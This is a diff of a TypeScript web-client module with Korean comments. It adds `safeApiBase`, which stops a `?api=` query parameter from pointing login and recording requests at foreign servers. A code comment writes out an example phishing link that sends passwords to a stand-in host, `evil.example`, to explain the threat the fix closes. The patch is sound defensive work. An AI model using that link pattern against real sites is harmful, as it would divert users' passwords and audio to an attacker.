@@ -94,6 +94,65 @@ export function loginUrlFor(pathWithQuery: string): string {
 }
 
 /**
+ * 화면이 요청을 보낼 서버 주소.
+ *
+ * ⚠️ 모든 화면이 `?api=` 를 읽어 그대로 `fetch` 주소 앞에 붙였다. 이건
+ * 위 `safeRedirect` 가 막는 것보다 **나쁘다.** `next` 는 로그인이 *끝난 뒤*
+ * 어디로 가느냐를 바꾸지만, `api` 는 **비밀번호가 어디로 가느냐**를 바꾼다.
+ *
+ *     https://<진짜 도메인>/login.html?api=https://evil.example
+ *
+ * 이 링크를 받은 사람은 끝까지 진짜 도메인·진짜 자물쇠·진짜 로그인 화면에
+ * 머무른다. 눈으로 알아챌 단서가 하나도 없는데 평문 비밀번호가 남의 서버로
+ * 나가고, 공격자가 200 을 돌려주면 화면은 아무 일 없다는 듯 넘어간다.
+ * 로그인 화면만의 문제도 아니다 — 녹음 화면에서는 회의 음성이 나간다.
+ *
+ * 그런데 `?api=` 를 아예 없애면 개발할 때가 불편하다. 화면은 정적 서버
+ * (`:5173`)에 띄우고 API 는 `:8000` 에 띄우는 게 보통이라, 그때는 다른
+ * 포트를 가리켜야 한다. 그래서 **지금 보고 있는 화면 자체가 로컬일 때만**
+ * 허용한다. 진짜 도메인에서는 무슨 값을 넣든 무시된다 — 피싱 링크가
+ * 성립하는 곳은 진짜 도메인이므로, 막아야 할 곳만 정확히 막힌다.
+ *
+ * 같은 오리진의 경로(`/proxy` 같은 것)는 어디서든 허용한다. 그건 애초에
+ * 남의 서버로 나갈 수가 없다.
+ */
+const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);
+
+export function safeApiBase(raw: string | null, pageOrigin: string): string {
+  if (!raw) return '';
+
+  // 같은 오리진의 경로. `//evil.example` 과 `/\evil.example` 은 브라우저가
+  // 외부 주소로 읽으므로 safeRedirect 와 같은 기준으로 걸러낸다.
+  if (raw.startsWith('/')) {
+    if (raw.startsWith('//') || raw.startsWith('/\\')) return '';
+    return raw.replace(/\/+$/, '');
+  }
+
+  let target: URL;
+  let page: URL;
+  try {
+    target = new URL(raw);
+    page = new URL(pageOrigin);
+  } catch {
+    return '';
+  }
+
+  // 같은 오리진을 절대 주소로 쓴 것은 언제나 안전하다.
+  if (target.origin === page.origin) return target.origin + target.pathname.replace(/\/+$/, '');
+
+  // 여기서부터는 남의 오리진이다. 화면 자체가 로컬일 때만 허용한다.
+  if (!LOCAL_HOSTS.has(page.hostname)) return '';
+  if (!LOCAL_HOSTS.has(target.hostname)) return '';
+  if (target.protocol !== 'http:' && target.protocol !== 'https:') return '';
+  return target.origin + target.pathname.replace(/\/+$/, '');
+}
+
+/** 브라우저에서 쓰는 형태. 테스트는 위 순수 함수를 직접 부른다. */
+export function apiBaseFromLocation(search: string, pageOrigin: string): string {
+  return safeApiBase(new URLSearchParams(search).get('api'), pageOrigin);
+}
+
+/**
  * 서버 응답을 사람이 읽을 문구로.
  *
  * 401 을 "인증 실패" 라고만 쓰면 사람은 무엇을 고쳐야 할지 모른다.
